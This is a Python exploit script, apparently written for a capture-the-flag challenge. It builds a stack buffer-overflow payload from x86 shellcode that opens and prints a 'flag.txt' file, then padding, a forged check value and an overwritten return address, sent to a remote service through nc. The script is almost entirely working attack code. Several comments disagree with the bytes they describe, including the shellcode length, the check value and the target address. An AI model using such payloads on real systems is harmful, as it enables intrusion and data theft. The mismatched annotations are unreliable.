import sys
payload = b''
payload += b"\x31\xc0\x50\x68\x2e\x74\x78\x74\x68\x66\x6c\x61\x67\x6a\x2f\x66\x68\x6c\x6c\x66\x68\x68\x65\x66\x68\x6c\x6c\x6a\x2f\x68\x72\x65\x74\x68\x73\x68\x65\x66\x68\x6c\x6c\x6a\x2f\x68\x68\x6f\x6d\x6a\x65\x6a\x2f\x89\xe3\x31\xc9\xb0\x05\xcd\x80\x89\xc3\x89\xe1\xb2\x40\xb0\x03\xcd\x80\x89\xc2\x89\xe1\xb3\x01\xb0\x04\xcd\x80\x31\xdb\xb0\x01\xcd\x80"
# Add shellcode(64bytes).
payload += b'A' * (520 - 85 - 4) # Fill with any value.
payload += b'\xef\xcd\x76\x98' # Convert check element as 0x9876cdaf in little endian manner.
payload += b'\x0c\xf4\xff\xbf' # Fill old ebp area as any value.
# $esp = 0xbffff204
payload += b'\x04\xf2\xff\xbf' # Change ret addr as 0xbffff414 which is start addr of buf in little endian manner.
# $ebp = 0xbffff40c

sys.stdout.buffer.write(payload) # write bytes in standard output
print() # recommended to use for the nc-based exploitation
# to flush the remote server's stdin buffer
# bffff834